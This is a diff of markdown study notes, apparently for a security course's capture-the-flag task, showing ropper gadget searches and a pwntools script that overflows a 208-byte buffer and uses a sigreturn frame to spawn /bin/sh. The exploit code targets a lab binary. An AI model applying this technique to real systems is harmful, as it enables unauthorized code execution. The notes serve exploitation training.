@@ -18,7 +18,7 @@ pip install ropper
 ```
 - find gadgets
 ```
-ropper --file ./vuln
+ropper --all --file ./vuln
 ropper --file ./vuln --search syscall
 ropper --file ./vuln --inst-count 2 --type rop
 ropper --file ./vuln --search "mov rdi, e?x" --inst-count 2 --type rop
@@ -152,55 +152,69 @@ conn.interactive()
 - pwntools does all the heavly lifting for us:
 ```python
 import pwn
-pwn.context.arch = 'amd64'
 
+# this is required on gnome to start gdb
+pwn.context.terminal = ['gnome-terminal', '--']
+
+# pwninit
 exe = pwn.ELF("./vuln")
 
-conn = pwn.remote('tasks.ws24.softsec.rub.de', 33595)
+pwn.context.arch = 'amd64'
+#pwn.context.binary = exe
 
-# Pie is off, this makes live easy :)
-shell_string = next(exe.search(b'/bin/sh\x00'))
+port = 1024
+#conn = pwn.remote('tasks.ws24.softsec.rub.de', port)
+conn = pwn.process([exe.path])
 
-# I want to execute the following shellcode:
+pwn.gdb.attach(conn, gdbscript="""
+set detach-on-fork off
+set follow-fork-mode child
+""")
+
+pwn.pause()
+
+# we have a 200 byte buffer but can read 0x200 = 512 bytes
+# simple rop chain by hand using gadgets (not many)
+# we can use 
+
+# ropper --all --file ./vuln
 """
-mov rax, 59
-moc rdi, 0x402029; # the address of '/bin/sh\x00'
-mov rsi, 0
-mov rdx, 0
-syscall
+    mov rax, 59;
+    lea rdi, [rip + sh];
+    mov rsi, 0;
+    mov rdx, 0;
+    syscall;
+    ret;
+sh:
+    .string "/bin/sh"
 """
 
-# found via ropper
-pop_rax_gadget = 0x00000000004010b3 # pop rax; ret; 
-syscall_gadget = 0x0000000000401010 # syscall;
+bin_sh_pointer = next(exe.search(b'/bin/sh\x00'))
+print(hex(bin_sh_pointer))
+
+gadget_pop_rax = 0x00000000004010b3#: pop rax; ret;
+gadget_syscall = 0x0000000000401010#: syscall;
 
 # first we execute the syscall "SIGRETURN" (15) to setup the 4 register, then we just return to syscall again to get a shell :)
-
-# rop.execve(next(binary.search('/bin/sh'), 0, 0))
 frame = pwn.SigreturnFrame()
-# do the execve syscall (this replaces this process with "bin/sh", this is a more lower level call than system() which created a new child via fork)
 frame.rax = 59
-frame.rdi = shell_string
+frame.rdi = bin_sh_pointer
 frame.rsi = 0
 frame.rdx = 0
-frame.rip = syscall_gadget
+frame.rip = gadget_syscall
 
-rop = pwn.ROP(exe)
-rop.raw(pop_rax_gadget)
 # do the sigreturn syscall (15) (https://syscalls.mebeim.net/?table=x86/64/x64/latest)
-rop.raw(15)
-rop.raw(syscall_gadget)
-rop.raw(bytes(frame))
+rop_chain = [
+    pwn.p64(gadget_pop_rax),
+    pwn.p64(15),
+    pwn.p64(gadget_syscall),
+    bytes(frame)
+]
 
-rop = pwn.ROP(libc)
-rop.call(rop.ret)
-rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
+payload = b'A' * 208 + b''.join(gadget for gadget in rop_chain)
 
-payload = b'A' * 208 + rop.chain()
+conn.sendline(payload)
 
-print(f'payload length: {len(payload)}')
-
-conn.send(payload)
 conn.interactive()
 ```
 
